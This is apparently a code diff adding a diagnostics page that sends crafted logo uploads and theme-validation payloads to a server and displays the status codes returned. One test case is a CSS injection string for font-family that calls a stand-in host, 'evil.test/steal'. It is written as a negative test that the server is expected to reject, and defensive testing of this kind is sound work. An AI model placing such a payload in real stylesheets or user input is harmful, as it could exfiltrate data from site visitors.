+  { id:'big',     label:'PNG larger than 2 MB',
+    note:'Expected 413',
+    make:() => mkFile(new Uint8Array(2 * 1024 * 1024 + 64), 'huge.png', 'image/png') }
+];
+
+const THEME_CASES = {
+  css:     { label:'CSS injection in font-family', payload:{ fontFamily:'system; background:url(//evil.test/steal)' },
+             note:'Sends a value that would close the CSS declaration — expected 422' },
+  hex:     { label:'Invalid colour',   payload:{ primaryColor:'blue' },
+             note:'Named colours are not hex — expected 422 with a field error' },
+  size:    { label:'Font size 99',     payload:{ fontSize:99 },
+             note:'Outside the 12–32 range — expected 422' },
+  partial: { label:'Partial update',   payload:{ textColor:'#7a1f1f' },
+             note:'Sends only textColor — the other fields must survive' }
+};
+
+function vUploadTests(v){
+  if(guard(v)) return;
+  v.innerHTML = `
+  <div class="tcols">
+    <div>
+      <div class="card">
+        <header><h2>Send a crafted file</h2></header>
+        <div class="in">
+          <p class="note" style="margin-bottom:12px">This page is a diagnostics harness rather than a feature an administrator would normally see. Each button builds a real file in memory and pushes it through the same checks the upload endpoint runs: mimetype filter, magic-byte sniffing, structural completeness, SVG sanitisation, content hashing. Successful uploads change the logo across the whole register.</p>
+          <div class="tests">
+            ${UPLOAD_CASES.map(c => `<button class="btn" data-case="${c.id}"><strong>${esc(c.label)}</strong><br><span style="color:var(--muted)">${esc(c.note)}</span></button>`).join('')}
+          </div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:14px">
+        <header><h2>Theme validation</h2></header>
+        <div class="in"><div class="tests">
+          ${Object.entries(THEME_CASES).map(([k, c]) => `<button class="btn" data-tcase="${k}"><strong>${esc(c.label)}</strong><br><span style="color:var(--muted)">${esc(c.note)}</span></button>`).join('')}
+        </div></div>
+      </div>
+    </div>
+
+    <div class="tsticky">
+      <div class="card">
+        <header><h2>Results</h2>${TRESULTS.length ? '<button class="btn sm" id="tclr" style="margin-left:auto">Clear</button>' : ''}</header>
+        <div class="in" id="tres">
+          ${TRESULTS.length ? TRESULTS.map(r => `
+            <div style="border-bottom:1px solid var(--line2);padding:9px 0">
+              <div class="row" style="gap:8px;align-items:baseline">
+                <span class="mono" style="color:${r.status < 300 ? 'var(--moss)' : 'var(--oxide)'};font-weight:500">${r.status}</span>
+                <strong style="font-size:13px">${esc(r.label)}</strong>
+              </div>
+              <div style="color:var(--muted);font-size:12.5px;margin-top:3px">${esc(r.detail)}</div>
+              ${r.extra ? `<div class="mono" style="font-size:11.5px;margin-top:4px;color:var(--muted);word-break:break-all">${esc(r.extra)}</div>` : ''}
+            </div>`).join('') : '<p class="note">No tests run yet.</p>'}
+        </div>
+      </div>
+      <div class="card" style="margin-top:14px">
+        <header><h2>Request log</h2></header>
+        <div class="in"><div class="rlog" id="rlog">${renderRlog()}</div></div>
+      </div>
+    </div>
+  </div>`;
+
+  v.querySelectorAll('[data-case]').forEach(b => b.onclick = () => runUploadCase(b.dataset.case));
+  v.querySelectorAll('[data-tcase]').forEach(b => b.onclick = () => runThemeCase(b.dataset.tcase));
+  const c = document.getElementById('tclr');
+  if(c) c.onclick = () => { TRESULTS = []; render(); };
+}
+
+function pushResult(r){
+  TRESULTS.unshift(r);
+  if(TRESULTS.length > 20) TRESULTS.length = 20;
+}
+
+async function runUploadCase(id){
+  const c = UPLOAD_CASES.find(x => x.id === id);
+  try{
+    const res = await TAPI.postLogo(c.make());
+    let detail = res.deduplicated
+      ? 'Accepted — those exact bytes were already stored, so no second file was written.'
+      : 'Accepted and stored.';
+    if(res.replaced && !res.deduplicated) detail += ' The previous file was deleted after the settings commit.';
+    if(res.sanitizedBytes > 0) detail += ` ${res.sanitizedBytes} bytes of active content were stripped.`;
+    pushResult({ status:201, label:c.label, detail, extra:res.logo.filename });
+  }catch(err){
+    if(handleAuthLoss(err))return;
+    pushResult({ status:err.status || 500, label:c.label, detail:err.message, extra:err.code });
+  }
+  render();
+}
+
+async function runThemeCase(kind){
+  const c = THEME_CASES[kind];
+  try{
+    const res = await TAPI.putTheme(c.payload);
+    S.theme = res.theme; TDRAFT = { ...res.theme }; TSAVED = { ...res.theme };
+    applyTheme(res.theme);
+    pushResult({ status:200, label:c.label,
+      detail:'Accepted. The fields the payload omitted kept their stored values.',
+      extra:`primaryColor=${res.theme.primaryColor} fontFamily=${res.theme.fontFamily} fontSize=${res.theme.fontSize}` });
+  }catch(err){
+    pushResult({ status:err.status || 500, label:c.label, detail:err.message,
+      extra: err.fields ? Object.entries(err.fields).map(([k, v]) => `${k}: ${v}`).join(' | ') : err.code });
+  }
+  render();
+}
+</script>
+</body>
